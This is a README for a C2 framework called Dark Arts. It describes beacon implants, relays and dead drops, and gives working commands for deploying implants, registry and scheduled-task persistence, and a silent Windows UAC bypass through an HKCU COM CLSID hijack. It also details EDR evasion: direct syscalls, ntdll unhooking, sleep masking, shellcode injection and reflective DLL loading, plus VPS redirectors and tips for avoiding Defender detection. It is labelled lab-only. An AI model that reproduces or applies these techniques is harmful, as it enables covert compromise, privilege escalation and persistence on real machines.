# Dark Arts

An asynchronous, mesh-capable command-and-control (C2) framework for laboratory research and authorized security testing.

Dark Arts is built around a simple asymmetry: **implants never wait, operators never connect to targets**. Beacons check in on their own schedule; tasking and results are exchanged as encrypted blobs through a chain of stateless relays and rendezvous points. The operator console talks only to a control server, which never touches the target network.

> **Authorized use only.** Everything here is designed for container labs and test accounts with written authorization and per applicable law. See [THREAT_MODEL.md](THREAT_MODEL.md) for the security model and constraints.

## What it is

- **Asynchronous tasking** — task blobs are dropped by the server and picked up by beacons on their own schedule (default 60 s, per-session jitter, adjustable at runtime with a `sleep` task).
- **Mesh relays** — relays inside the target LAN forward edge traffic so beacons never need direct egress; a relay holds no session keys and sees only ciphertext.
- **Ratcheted forward secrecy** — every session derives its own AEAD key stream via X25519 ECDH + HKDF ratchet. A counter mismatch (lost blob, restored state) is recovered deterministically by replaying the ratchet.
- **Crash/restart persistence** — server and beacon persist per-session send counters and last-task positions, so both sides resynchronize after restarts without skipping or replaying tasks. The server also persists its registered sessions (`state.json`: send positions + agent public keys), so a server restart does not orphan implants — sessions are replayed on startup with their ratchets restored.
- **Traffic mimicry** — optional per-request browser headers and rotating user agents, plus cover pages on the edge; the beacon can also emit periodic "noise" fetches to benign-looking endpoints.
- **Pluggable stores** — edge blobs live in a file store or S3/MinIO.
- **Rendezvous dead drops** — DNS TXT (own authoritative zone), file drops, and gist drops; all content is signed (operator ed25519) and encrypted.
- **Operator console** — a small REPL that lists sessions, issues tasks, streams live events over a WebSocket, and can kill or re-sleep beacons.

## Architecture

```
                     +---------------- TARGET NETWORK ----------------+
                     |                                               |
  operator console --+--> server --> edge --> relay <--> relay --+   |
        (API)             (egress)     (egress)   (LAN)  (LAN)    |   |
                     |                    ^                        |   |
                     |                    |         beacon +--<----+   |
                     |                    |          (implant)         |
                     |              dead drops (DNS TXT / gist / file) |
                     +------------------------------------------------+
```

Data flow:

- **Tasking:** `console --POST--> server --(encrypt+store)--> S3/file store --(blob list)--> edge --(beacon poll)--> beacon --(decrypt, verify)--> execute`
- **Results:** `beacon --(encrypt+store)--> edge --(pump)--> server --(GET)--> console`
- **Rendezvous:** `stager --(DNS/gist/file)--> signed+encrypted stage instructions`

### Components

| Component | Role | Never sees | Notes |
|---|---|---|---|
| `server` | Session manager, tasking queue, result store, REST API + WebSocket for the console | plaintext tasking | holds session ratchet state and per-session send counters (persisted to `data/server/state.json`) |
| `edge` | Stateless HTTPS ingress on the egress network; stores ciphertext blobs; serves cover pages | plaintext, session keys | store is file-based or S3/MinIO; scales to zero |
| `relay` | LAN-side forwarder for beacon HTTP; retries and persists pending uploads when upstream is down | session keys, plaintext | connects upstream to another relay or the edge; a beacon never needs direct egress |
| `beacon` | Implant; polls `edge/relay/tasks/{sid}?f=server&since=N`, executes tasks, posts results to `/ingest?f=beacon` | — | derives its identity from a 32-byte seed; session keys in memory only; persists `{send_pos, last_task}` |
| `stager` | First stage; fetches a signed, encrypted beacon stage from a dead drop | — | two modes: `memory` (exec in-process) and `child` (spawn a process); TTP `inject` integration is not yet implemented |
| `console` | Operator REPL | — | talks to the server API only |
| dead drops | Passive rendezvous (DNS TXT zone, file dir, gist) | operator identity | content is always signed + encrypted |
| `minio` (lab) | S3-compatible object store holding encrypted blobs | plaintext | |

### Crypto model

- **Identities:** ed25519 keypairs derived from seeds. The server has one (`DARKARTS_SERVER_SEED`); every agent has one; the operator signs tasks and stage drops with another (`-operator-pub`).
- **Session IDs:** `sid = sha256(agent_public_key)[:16]` (32 hex chars). Sessions are registered on the server by `touch <sid> <agent_pub_hex>`.
- **Sessions:** X25519 ECDH between agent and server identities, HKDF-ratcheted per send; every envelope is AEAD-authenticated — an observer, the edge, or a seized relay cannot read or forge tasking.
- **Counters:** each envelope carries a monotonic send counter. Server and beacon persist them; on startup the beacon calls `SkipSend(n)` so its ratchet catches up, and the server replays tasks with `since=N` so nothing is delivered twice or lost. After a restore, wipe the edge store so stale blobs cannot inflate a fresh beacon's `last_task` past new counters.

## Repository layout

```
cmd/          binaries: server, edge, relay, beacon, stager, console, genid
pkg/          libraries: crypto, tasking, mesh, edge, relay, server, beacon,
              console, stager, deaddrop, mimic, store, transport, ttp, logging
lab/          Docker lab: docker-compose.yml, Dockerfiles, bind9 zone, victim pages
Makefile      build/test/lab targets (Linux/macOS; on Windows run docker compose directly)
THREAT_MODEL.md   threat model, trust boundaries, adversary classes
```

## Quick start (first beacon in ~5 minutes)

### 1. Prerequisites

- Go 1.26+
- Docker with the compose plugin (Docker Desktop on Windows with WSL2, or docker + docker-compose-plugin on Linux)
- `curl`; DNS lookups can be done through the lab's DNS container if `dig` is not on the host

### 2. Build the binaries

```sh
go build ./...
```

Cross-compile the beacon for Linux targets (static, no CGO):

```sh
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o beacon ./cmd/beacon
```

### 3. Bring up the lab

```sh
docker compose -f lab/docker-compose.yml up -d --build --wait
```

This builds and starts nine containers. Everything should report `healthy`:

```sh
docker compose -f lab/docker-compose.yml ps
```

| Container | IP | Host ports |
|---|---|---|
| `darkarts-dns` | 10.0.42.200 | 127.0.0.1:5553/udp+tcp (DNS) |
| `darkarts-minio` | egress | 127.0.0.1:9000 (S3), 9001 (console) |
| `darkarts-edge` | 10.0.43.210 | 127.0.0.1:8443 (HTTPS) |
| `darkarts-relay` | 10.0.42.210 (+egress) | 127.0.0.1:7443 |
| `darkarts-server` | egress | 127.0.0.1:9002 (API) |
| `darkarts-tunnel` | egress | — (Cloudflare quick tunnel → relay :7443; URL in `docker logs`) |
| `darkarts-victim1..3` | 10.0.42.3+ | — |

Networks: `darkarts-net-lan` (10.0.42.0/24 — victims and relay) and `darkarts-net-egress` (10.0.43.0/24 — edge, minio, server). The relay spans both; victims resolve `edge.darkarts.lab` to the relay via Docker `extra_hosts` and via the lab zone:

```sh
docker exec darkarts-dns dig @127.0.0.1 +short TXT _dd.darkarts.lab   # ph0-deaddrop-ok
docker exec darkarts-dns dig @127.0.0.1 +short A edge.darkarts.lab    # 10.0.42.210
curl http://127.0.0.1:8443/healthz     # ok   (edge)
curl http://127.0.0.1:7443/healthz     # ok   (relay)
curl -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8443/          # 200 (cover page)
curl -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8443/nope      # 404 (nginx-looking)
```

> The lab DNS host port is 5553 because Windows reserves 5353 (mDNS), 5354, and 5355 (LLMNR). If a port is taken on your host, change the `ports:` mapping and the zone in `lab/`.
>
> The DNS service mounts `lab/dns/` (writable) as `/etc/bind` — named needs to write its `.jnl` journal there to accept TSIG-signed dynamic updates (`deaddrop.NewDNS(...).Publish`). Do not change this to read-only file mounts.

### 4. Deploy a beacon into a victim

The lab ships with fixed identities. The server's seed is `0101…01` (its public key is `a4e09292b651c278b9772c569f5fa9bb13d906b46ab68c9df9dc2b4409f8a209`); the API key is `opkey`.

```sh
docker cp beacon darkarts-victim1:/tmp/beacon
docker exec -u root darkarts-victim1 chmod +x /tmp/beacon
docker exec -d darkarts-victim1 sh -c \
  'DARKARTS_SEED=0202020202020202020202020202020202020202020202020202020202020202 \
   DARKARTS_SERVER_PUB=a4e09292b651c278b9772c569f5fa9bb13d906b46ab68c9df9dc2b4409f8a209 \
   DARKARTS_EDGE=http://edge.darkarts.lab:7443 \
   DARKARTS_STATE_DIR=/tmp/beacon-state \
   DARKARTS_SLEEP=2 DARKARTS_MIMIC=true /tmp/beacon > /tmp/beacon.log 2>&1'
docker exec darkarts-victim1 cat /tmp/beacon.log
```

The beacon derives `sid = sha256(agent_pub)[:16]` from its seed and logs it (for seed `0202…02`: `cfa570c653bd212b10a9cb551fd7a1b4`). Register the session with the server:

```sh
curl -s -X POST http://127.0.0.1:9002/api/v1/sessions \
  -H 'Authorization: Bearer opkey' -H 'Content-Type: application/json' \
  -d '{"id":"cfa570c653bd212b10a9cb551fd7a1b4","agent_pub":"ce8d3ad1ccb633ec7b70c17814a5c76ecd029685050d344745ba05870e587d59"}'
```

To use a fresh seed, compute the public key with a short Go helper (ed25519 from the seed) or copy the `sid` from the beacon log and derive the pubkey with the same helper — the server refuses a touch without the correct `agent_pub`.

### 5. Operate with the console

```sh
go build -o console.exe ./cmd/console
set DARKARTS_SERVER_URL=http://127.0.0.1:9002   # $env: on PowerShell
set DARKARTS_API_KEY=opkey
set DARKARTS_OP_ID=op-lab
.\console.exe
```

Commands:

| Command | Purpose |
|---|---|
| `sessions` / `ls` | list registered sessions |
| `session <id>` | session detail |
| `touch <id> <pub_hex>` | register a session (id + agent public key) |
| `ttps` | list available task types |
| `task <sid> <type> [k=v …]` | issue a task (e.g. `task <sid> shell cmd=echo hello`) |
| `tasks` | list task queue |
| `results [sid]` | list results |
| `kill <sid>` | send a kill directive (beacon exits cleanly) |
| `sleep <sid> <seconds>` | change the beacon's sleep interval |
| `uactest <sid> [cmd]` | issue a silent elevation test (`method=daily`) and watch for the result |
| `uacdll [-SkipBeacon]` | rebuild the UAC payload DLL from `pkg/beacon/uacdll/darts_ucd.c` (then `package -Seed <seed>`) |
| `watch` | stream live task/result events (`stop` to exit) |
| `quit` / `exit` | leave |

#### Persistence tasks

`persist` / `unpersist` install or remove logon persistence from the beacon. Parameters: `method` (`reg`, `schtasks`, `startup` — required), `name` (required; registry value / task name / file base name), `cmd` (optional; defaults to a hidden relaunch of the beacon itself).

```sh
task <sid> persist    method=reg      name=sysaux        # HKCU\...\CurrentVersion\Run
task <sid> persist    method=schtasks name=sysaux        # needs an elevated beacon (ONLOGON task)
task <sid> persist    method=startup  name=sysaux        # Startup folder .cmd
task <sid> unpersist  method=reg      name=sysaux
```

`reg` and `startup` work from a non-elevated beacon; `schtasks` (ONLOGON trigger) requires elevation — the beacon reports `Access is denied` otherwise. Verify with `reg query HKCU\...\Run /v <name>`, `schtasks /Query /TN <name>`, or the Startup folder.

Scripted (non-interactive) runs work by piping a file of commands into the binary.

### 6. Verify end-to-end

Issue a task, then confirm the result:

```sh
curl -s -X POST http://127.0.0.1:9002/api/v1/tasks \
  -H 'Authorization: Bearer opkey' -H 'Content-Type: application/json' \
  -d '{"session_id":"cfa570c653bd212b10a9cb551fd7a1b4","op_id":"op-lab","type":"shell","params":{"cmd":"echo darkarts-e2e-ok"},"signed_by":"op-lab"}'
curl -s http://127.0.0.1:9002/api/v1/results -H 'Authorization: Bearer opkey'   # output is base64
docker exec darkarts-victim1 cat /tmp/beacon-state/state.json                  # {"send_pos":1,"last_task":1}
docker exec darkarts-minio sh -c 'mc alias set m http://127.0.0.1:9000 darkarts darkarts-lab >/dev/null 2>&1; mc ls -r m/darkarts'
```

You should see one `server/00000000000000000000` blob (the task) and one `beacon/00000000000000000000` blob (the result) per session under their `sid/` prefixes in MinIO.

## First-time walkthrough (lab host → Windows laptop)

The full zero-to-deployed flow for a Windows lab host (Go + Docker Desktop) and a Windows 11 target laptop. Everything after step 4 runs from the operator console (`lab\console.cmd`).

### 1. Prerequisites

- **Lab host:** Go 1.26+ (`C:\Program Files\Go\bin\go.exe` — the lab scripts hardcode this path), Docker Desktop (WSL2) with the compose plugin, git. w64devkit (`C:\Users\<you>\w64devkit`) only if you ever rebuild the UAC payload DLL from C.
- **Target laptop:** Windows 11 **24H2+** for the zero-prompt daily UAC channel (`method=daily`); on Win10 only the one-time-prompt `method=schtasks` path works.

### 2. Clone and build

```powershell
git clone <your-repo-url> "C:\Users\<you>\Dark Arts"
cd "C:\Users\<you>\Dark Arts"
go build ./...
```

### 3. Start the lab

```powershell
lab\start-lab.cmd
```

Brings up server, edge, relay, minio, DNS, victims, tunnel and waits for `http://127.0.0.1:9002/healthz` and `http://127.0.0.1:7443/healthz` to answer `ok`.

### 4. Open the console

```powershell
lab\console.cmd
```

### 5. Build + register the laptop package

```
dark-arts> package
```

One command: fresh identity, auto-detected LAN edge, `lab\laptop-pkg\beacon.exe` built (self-contained — UAC payload DLL embedded, 15 s sleep, sleep-mask on), session registered. It prints the **seed** (reuse with `package -Seed <seed>`) and the **sid**.

### 6. Deploy to the laptop (the only physical step)

Copy `lab\laptop-pkg\beacon.exe` to the laptop and double-click it (no console window, no env vars, single instance). Wait ~15 s, then:

```
dark-arts> sessions          # the laptop's sid shows a recent last-seen
```

### 7. Test the silent UAC elevation channel

```
dark-arts> uactest <sid>
```

First result waits for the stock Windows `UnifiedConsentSyncTask` daily fire (12:00±2h, or at wake-up) that bootstraps the channel; the console prints the on-laptop verification checklist if it times out. After the first fire, every `uac` command returns in seconds, fully silent:

```
dark-arts> uactest <sid>                 # whoami /groups elevated
dark-arts> task <sid> uac cmd=net user
```

One-time-prompt fallback: `task <sid> uac method=schtasks cmd=whoami /groups`.

### 8. Routine operation

```
dark-arts> task <sid> shell cmd=whoami
dark-arts> results
dark-arts> watch                        # live events; "stop" to exit
dark-arts> sleep <sid> 60
dark-arts> task <sid> persist method=reg name=sysaux
dark-arts> kill <sid>
```

### 9. Teardown

```powershell
lab\stop-lab.cmd        # or: docker compose -f lab/docker-compose.yml down -v
```

To un-arm the daily channel on a laptop: delete the HKCU CLSID override key, `%TEMP%\darts_ucd.dll`, `%TEMP%\darts-uac-work.txt`, and `schtasks /Delete /TN \DarkArts-uac /F`.

## Deploying to a Windows laptop

The lab's relay port is published on `0.0.0.0:7443` (with an inbound firewall rule), so an implant on another machine on the same network can check in through it. The beacon accepts a **comma-separated edge list** and tries each candidate in order at every check-in (any HTTP answer wins, 3 s probe timeout), so the same binary works on the lab LAN and on a foreign WiFi (via a VPS redirector — see the next section).

### Build the package (one command)

```powershell
# PowerShell on the lab host (this repo) — build + auto-register in one step
lab/make-laptop-package.ps1 -SleepMask
#   generates a fresh identity, auto-detects the host's LAN IP as the primary
#   edge, builds beacon.exe, and POSTs the session to the server (auto-registers)
```

The script prints the generated seed (keep it to redeploy the same identity later). Options:

| Flag | Meaning |
|---|---|
| `-Seed <64-hex>` | rebuild/register a specific identity (default: random) |
| `-Edge "http://ip:7443,https://...trycloudflare.com"` | explicit edge list (default: auto-detected LAN IP) |
| `-SleepMask` / `-NoInject` | enable the sleep mask / drop the inject TTP |
| `-ServerUrl` / `-ApiKey` | registration target (default `http://127.0.0.1:9002`, `opkey`) |
| `-Insecure` | bake `cfgInsecure=true`: skip TLS certificate verification (needed for self-signed redirector certs) |
| `-SkipRegister` | build only; print the `POST /api/v1/sessions` line to run later |

This builds a **self-contained `beacon.exe`** (stealth recipe) with the seed, server public key, edge candidate list, 15 s sleep and a `beacon.log` next to it baked in via `-ldflags -X`. The target user just copies the single exe and double-clicks it — no environment variables, no launcher script. `DARKARTS_*` variables still take precedence when set (a comma-separated `DARKARTS_EDGE` overrides the baked list). The script prints the identity and **registers the session itself** (`POST /api/v1/sessions` is idempotent, so re-running just re-touches it). Results appear under the new sid. Use `-NoInject` to build a beacon without the inject TTP if the target's AV objects. Generate identities with `go run ./cmd/genid <seed-hex-64>`.

### Operate everything from the console

`lab\console.cmd` on the lab host sets the right `DARKARTS_SERVER_URL`/`DARKARTS_API_KEY`; then:

```
dark-arts> package              # build beacon.exe + register the session (fresh identity, auto LAN edge)
dark-arts> sessions             # confirm the new sid
dark-arts> task <sid> shell cmd=whoami
dark-arts> results              # watch for the base64 result
dark-arts> kill <sid>
```

### Silent elevation (`uac`) — the zero-prompt daily channel

The `uac` task runs a command with a full elevated token. The default method (`daily`) is **fully silent — no UAC prompt ever**:

- **Mechanism:** the stock Win11 24H2+ `UnifiedConsentSyncTask` (`\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`) is a Group/BA, `HighestAvailable`, non-idle-gated task with a daily `TimeTrigger` (12:00±2h, `StartWhenAvailable` — also fires at wake-up) that runs **in the interactive user's session** and activates its ComHandler CLSID `{82AA0895-198A-4C1B-B2D1-C16894218AFB}` at HIGH. The beacon drops a payload DLL at `%TEMP%\darts_ucd.dll` and points the **HKCU override** for that CLSID at it (HKLM still owns the real handler, so scheduler validation passes, but user-session activation consults HKCU first — verified live in the lab). On each daily fire the DLL loads at HIGH, bootstraps the reusable `\DarkArts-uac` HIGHEST task (InteractiveToken, no triggers, hidden), and runs the pending command; it then returns `REGDB_E_CLASSNOTREG`, so the host reports a benign activation failure.
- **First invocation** arms the channel and waits up to ~26h for the next fire (the beacon's task loop is busy meanwhile). **After the first fire the reusable task exists and every `uac` command returns in ~2–5 s** via a silent `schtasks /run`.
- **Fallbacks:** `method=schtasks` (one-time ShellExecute `runas` prompt, then silent forever), plus the classic `cmluautil`/`fodhelper`/`computerdefaults` methods.
- **Verify on the laptop after a fire:** `type %TEMP%\uc_daily_marker.txt` (`il=1` lines = loaded at HIGH, last line `done`), `schtasks /query /tn \DarkArts-uac`, `reg query "HKCU\Software\Classes\CLSID\{82AA0895-198A-4C1B-B2D1-C16894218AFB}\InprocServer32"` (→ `%TEMP%\darts_ucd.dll`).
- **Console automation:** `uactest <sid> [cmd]` issues the task and watches for the result (prints the checklist + troubleshooting if the first fire hasn't happened yet); `uacdll` recompiles the payload from `pkg/beacon/uacdll/darts_ucd.c` when it changes (then `package -Seed <seed>` to bake it in).
- **Caveats:** requires Win11 24H2+ (no `UnifiedConsentSyncTask` on Win10 — use `method=schtasks`); the laptop user must be logged on; Defender must not flag the DLL (rebuild from a clean gcc if it does; keep the DLL out of Go c-shared builds — those get ML-flagged).
- **Teardown:** delete the HKCU override key, `%TEMP%\darts_ucd.dll`, `%TEMP%\darts-uac-work.txt`, and the `\DarkArts-uac` task.

## Cross-network deployment (VPS redirector)

The production-grade path (Sliver/CS-style): a VPS terminates TLS on 443 and forwards to the lab relay, so the target laptop needs no client software and can be on any network. `lab/redirector/setup.sh` provisions the VPS in one shot on Debian/Ubuntu:

```sh
# on the VPS:  ./setup.sh <lab-host-ip> [domain]
./setup.sh <lab-ip>            # self-signed cert -> beacon needs -Insecure
./setup.sh <lab-ip> c2.example.com   # Let's Encrypt cert (DNS A record -> VPS)
```

- nginx terminates HTTPS :443 → plain HTTP → `<lab-host-ip>:7443` (the relay; no relay changes needed).
- The lab host's Windows firewall must allow inbound TCP 7443 from the VPS: `New-NetFirewallRule -DisplayName "darkarts-relay" -Direction Inbound -Protocol TCP -LocalPort 7443 -Action Allow`.
- Oracle Cloud free tier (and AWS/GCP/Azure): works — `setup.sh` handles both apt (Ubuntu) and dnf (Oracle Linux). Two provider-specific steps: add an ingress rule for TCP 443 (and 80 while certbot runs) in the OCI **security list** (GCP: a VPC firewall rule — `gcloud compute firewall-rules create darkarts-443 --allow tcp:443,tcp:80 --direction INGRESS --source-ranges 0.0.0.0/0`); VM-level ufw alone is not enough. And the lab host must be reachable from the VPS on 7443 (home NAT: router port-forward, or CG-NAT breaks it — verify with `nc -vz <lab-ip> 7443` from the VPS).
- Then build the package against it (multi-edge keeps the LAN path for same-network beacons):

```powershell
lab\make-laptop-package.ps1 -Edge "https://<vps-ip>:443,http://<lab-ip>:7443" -Insecure
```

`-Insecure` bakes `cfgInsecure=true` so self-signed redirector certs verify cleanly; with a real Let's Encrypt cert you can drop it. The full path (beacon → https :443 → nginx → relay → server) is tested locally via a TLS reverse proxy: task round-trips cleanly through the HTTPS edge.

### Console-driven setup

`redirector` in the console does everything — key generation, VPS provisioning, verification, package build+registration:

```
dark-arts> sshkey                             # show/generate the ed25519 key (paste into the VPS)
dark-arts> redirector user@203.0.113.5        # provision nginx TLS :443 -> lab relay :7443, verify, build+register
dark-arts> redirector -Reverse user@203.0.113.5   # same, but the VPS forwards into an outbound SSH tunnel
```

`redirector` requires key-based SSH to the VPS (the console `sshkey` command generates/prints the key to paste), passwordless sudo for the SSH user, and the provider's firewall open on 443 (see below); it auto-detects the lab host IP, provisions nginx (`lab/redirector/setup.sh` via ssh), verifies the forward, then builds a package with edges `https://<vps>:443,http://<lab-ip>:7443 -Insecure` and registers it. A non-elevated console skips the Windows firewall rule (run elevated or add `New-NetFirewallRule -DisplayName "darkarts-relay" -Direction Inbound -Protocol TCP -LocalPort 7443 -Action Allow`).

### Reverse mode (lab host behind NAT/CG-NAT — e.g. on public WiFi)

The VPS forwards :443 into an **outbound SSH tunnel** maintained by the lab host, so no inbound ports are needed anywhere:

```
dark-arts> redirector -Reverse <user@vps> [domain]
```

The command provisions nginx with upstream `127.0.0.1:7443`, starts `lab\redirector\tunnel.cmd <user@vps>` (ssh `-R 7443:127.0.0.1:7443` with keepalive + 5s reconnect loop) in its own window, verifies the full path from the VPS, then builds + registers the package (edges `https://<vps>:443,http://<auto-detected-lab-ip>:7443 -Insecure` — the LAN fallback is the lab host's real IP, never `127.0.0.1`, so a same-network beacon doesn't point at itself). The tunnel window must actually run: if the verification prints `healthz returned 502`, the SSH forward wasn't up yet — check the tunnel window for errors and confirm the listener on the VPS with `ss -tlnp | grep 7443`. `-Insecure` is a real flag throughout (console `package` → `make-laptop-package.ps1` → baked `cfgInsecure=true` in the beacon; the package output prints `TLS: certificate verification disabled (baked -Insecure)`). For a persistent tunnel across reboots: `lab\redirector\install-tunnel-task.ps1 <user@vps>` (scheduled task at logon). Keepalive is `ServerAliveInterval=30`.

### GCP free tier (tested live)

Debian 13 VM, external IP `<vps-ip>` in testing. Two gotchas beyond the generic steps above:

1. **SSH username comes from the key comment.** When you paste a bare public key into the VM's SSH-keys metadata field, GCP derives the OS user from the key's comment field — if your key comment is `darkarts-lab`, the user is `darkarts-lab`, *not* `debian`. `ssh darkarts-lab@<vps-ip>` from the lab host. (A `username:`-prefixed entry gives you that username instead; either is fine as long as you SSH as the user you created.)
2. **The SSH user needs passwordless sudo** or `setup.sh` dies at `apt-get update` with `Permission denied` on `/var/lib/apt/lists/lock` (the script now detects this and prints a hint). From the GCP browser SSH session (that user has sudo), run once:
   ```bash
   sudo bash -c 'echo "darkarts-lab ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/darkarts-lab && chmod 440 /etc/sudoers.d/darkarts-lab'
   ```
   then re-run `dark-arts> redirector -Reverse darkarts-lab@<vps-ip>`. The whole `redirector -Reverse` run is idempotent — re-running just re-installs, re-verifies and rebuilds. End-to-end verification in testing was `healthz 200` pulled from the VPS through the running tunnel.

### The Cloudflare quick tunnel (stopgap only)

The lab also ships a `tunnel` container that exposes the relay on a public URL with no account:

```sh
docker compose -f lab/docker-compose.yml up -d tunnel
docker logs darkarts-tunnel | grep trycloudflare   # -> https://<random>.trycloudflare.com
curl https://<random>.trycloudflare.com/healthz     # ok
```

The URL is **ephemeral**: it changes whenever the `tunnel` container restarts and account-less tunnels get throttled by Cloudflare (observed dead after ~13 h of QUIC timeouts; a restart did not recover it). Use the VPS redirector edge for anything real.

## Advanced evasion features

### Inject TTP — indirect syscalls (Windows x64, `-tags inject`)

The `inject` task type runs a position-independent x64 stub in the beacon's own process (`pid=0`) or in a remote process (`pid=<target>`). It is compiled out unless the beacon is built with the `inject` tag:

```sh
# PowerShell (Windows)
lab/build-beacon.ps1                          # -> beacon-inject.exe (stripped + trimpath)
# Linux/macOS cross-build equivalent
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -tags inject -trimpath -buildvcs=false \
  -ldflags "-s -w" -o beacon-inject.exe ./cmd/beacon
```

The inject path runs entirely on **direct syscalls** (`pkg/evasion` + `pkg/inject`) — no imported Windows API function is ever called, so user-mode hooks (ETW, AV instrumentation) are never reached on the execution path:

- **Stringless SSN resolution** — the 12 needed `Nt*` functions are identified by djb2 hash of their names (only hash constants in the binary, zero API-name strings). The export table is walked on a **clean `\KnownDlls\ntdll.dll` copy** (opened via `NtOpenSection`, mapped via `NtMapViewOfSection` with the section's own image attributes — same on-disk file, freshly mapped, tamper-proof against in-memory hooking) with a live-ntdll fallback; the RVA is bounds-checked against `SizeOfImage` before use. SSNs are then read straight out of the table (verified against the canonical Win10 22H2 table, e.g. `NtAllocateVirtualMemory=0x18`, `NtWriteVirtualMemory=0x3A`, `NtProtectVirtualMemory=0x50`, `NtCreateThreadEx=0xC9`, `NtWaitForSingleObject=0x04`).
- **Direct `syscall` gadget** — one ABI0 assembler trampoline (`pkg/evasion/syscall_amd64.s`) issues the `syscall` instruction itself and shuffles the up-to-11 arguments through the stack slot; no `ntdll` stub call, no `syscall`-site scanning. The whole table is resolved once per process, at first use.
- **Threading** — `NtCreateThreadEx` with the proper `ObjectAttributes` (a NULL one AVs on current builds); the kernel's ret-trampoline exits the thread with the stub's `eax` as exit code, read back via `NtQueryInformationThread` (`0x25`) after `NtWaitForSingleObject`.
- **Buffer lifetime** — the shellcode page is freed **only after the thread completes**: `SelfRun` deliberately leaks the ~4 KiB RX buffer (the thread starts asynchronously; freeing early makes it execute released pages and crash the process with `0xC0000005`), and `RemoteRun` frees after the 30 s wait finishes (a timeout leaks on purpose rather than killing the target).

**Indirect-syscall attempt (reverted):** a true indirect path (SSN + argument shuffle + `jmp` to a `syscall; ret` site inside the loaded ntdll's `.text`, resolved by scanning for `0F 05 C3` with a clean-image stub-tail offset fallback) was implemented and A/B-tested in the lab environment. Result: the indirect path is deterministic-correct only when `invokeSyscall` is called from the shallowest Go frame; through any nested Go function (`call()`/variadic trampoline) the executed syscall number comes back wrong (verified with RWX- and ntdll-gadgets, both failing at call depth ≥ 2 while the identical direct call at any depth returns correct statuses — e.g. `NtClose(0)` → `0xC0000008` 5/5 direct, garbage statuses 5/5 indirect). The direct path is byte-identical in ABI layout (verified by disassembly); the failure is therefore attributed to the lab environment's syscall monitoring (its ntdll is non-stock: `SCPCFG`/`fothk` sections, dual `0F 05 C3 CD 2E C3` stub tails) interfering with syscalls whose origin address/caller relationship it cannot reconcile. The code was reverted to the proven direct path; the gadget-resolution machinery and this finding are documented here for future work.

Defender caveat: compile-temp artifacts (`go test` binaries, one early sweep-era build) have been flagged by ML engines (`Trojan:Win32/Bearfoos.A!ml`, `Behavior:Win32/DefenseEvasion.A!ml`) and remediated. The stripped, final beacon builds (stealth recipe: `-s -w` + `-trimpath` + `-buildvcs=false` + per-build `-buildid`) have consistently passed — the indirect-syscall path avoids the hooked-API call patterns entirely. This is expected and documented — the inject path is behaviorally loud by design and belongs in authorized labs only.

### Sleep mask (`pkg/sleepmask`)

The beacon can mask its in-memory key material and payload buffers during every sleep cycle, so a memory scan or crash dump taken while the beacon is idle sees XOR-encrypted bytes at rest and no injected RX pages:

- **Enabling** — bake `-X main.cfgSleepMask=true` (the lab package does this with `-SleepMask`) or set `DARKARTS_SLEEP_MASK=true` at runtime.
- **What gets masked** — the crypto session chains (`pkg/crypto` uses fixed `[keySize]byte` arrays so the backing storage never moves; Go's GC does not scan `[]byte` contents, so XOR-in-place is safe), plus any registered regions such as the inject stub's RX page (registered by `pkg/inject` via `sleepmask.MaskSelfRegion`).
- **How** — a dedicated non-heap XOR-key page is made writable only for the duration of each mask/unmask cycle (via `NtProtectVirtualMemory`, so it flips RW → NOACCESS when idle and the key page is unreadable while masked). Heap-allocated registrations are XORed in place; non-heap regions (inject RX page) are XORed and set `PAGE_NOACCESS` while masked.
- **Safety** — a failed unmask (e.g. transient syscall failure) logs a warning and the beacon sleeps unmasked rather than crashing; every cycle is deliberately conservative (mask → sleep → unmask), so an interrupted cycle cannot leave the beacon unwakeable. Verified in the lab: shell/inject/kill round-trip cleanly across hundreds of mask cycles with the RX page registered, and the mask/unmask transitions are observable in the debug log.

### UDRL — unhook ntdll before syscall resolution

On every process start (once, under `sync.Once`), `pkg/evasion` resolves its 12 syscall SSNs against a **clean `\KnownDlls\ntdll.dll` mapping** and then **repairs the live ntdll stub prologues** from that copy: each hash-listed export's first 16 bytes are compared, and any live stub that differs from disk is rewritten (page flipped RW via the already-resolved `NtProtectVirtualMemory` SSN, bytes copied from the pristine image, protection restored). This neutralizes in-memory detours (user-mode EDR hooks, hotpatch prologues) so the live ntdll surface is byte-identical to the on-disk file after init.

- The clean mapping is **retained for the process lifetime** (the lab environment rejects a second `\KnownDlls` mapping per process, so remapping on demand is not an option there); it doubles as a pristine ntdll for the future reflective loader.
- Diagnostics: `evasion.DiagUnhook()` returns how many stubs were restored (0 = live image already matched disk — the expected steady state on a clean host), and `TestUnhookStubsMatchClean` asserts the live/clean byte equality invariant for all 12 exports after init.
- Note: UDRL repairs the live image's *user-mode* surface; it does not (and cannot) change what the environment's kernel-side syscall monitoring sees — the direct-syscall design already sidesteps user-mode instrumentation entirely, so this pass is defense-in-depth for anything in-process that might later invoke ntdll normally.

### Reflective loader (`pkg/reflective`)

`pkg/reflective` maps a Windows x64 PE DLL from memory into the beacon's own process — no `LoadLibrary`, no disk write, no ntdll mapping calls, and no loader-lock involvement. The `dll` task type drives it end-to-end:

- **Mapping** — headers, sections (image alignment, `PAGE_EXECUTE_READ` for code), plus the directory struct, export tables and relocation blocks are copied into a single `VirtualAlloc` region with manual size math (no `SizeOfImage`-computed overshoot). All page protection flips go through `NtProtectVirtualMemory`.
- **Relocations** — only `IMAGE_REL_BASED_DIR64` entries are processed (x64), applied against the preferred base, so the module is position-independent within the new allocation.
- **Imports** — the IAT is resolved without loader APIs: `getDllHandle` uses `syscall.LoadDLL` (LoadLibraryW on an already-loaded module returns its base), and `getProcedureAddress` walks the target DLL's export directory manually (parse names → ordinals → addresses, ordinal fallback). The ntdll `Ldr*` functions and a `GS:0x30` PEB walk were tried and rejected: in this environment Ldr calls from Go stacks fault (misaligned stack / ntdll memmove) and the PEB read returns garbage, so the manual walk is the only reliable path.
- **Execution** — after `DLL_PROCESS_ATTACH`-style init the requested export (`fn`, default `run`) is called via a tiny asm trampoline (`call_amd64.s`) that reserves the Win64 shadow space before the indirect call. The environment kills API calls executed from reflectively-mapped (unregistered) pages, so `pkg/reflective` never calls *through* the IAT — imports are resolved for the module's own use, and the import-variant test DLL proves resolution by returning the IAT slot value instead of calling it.
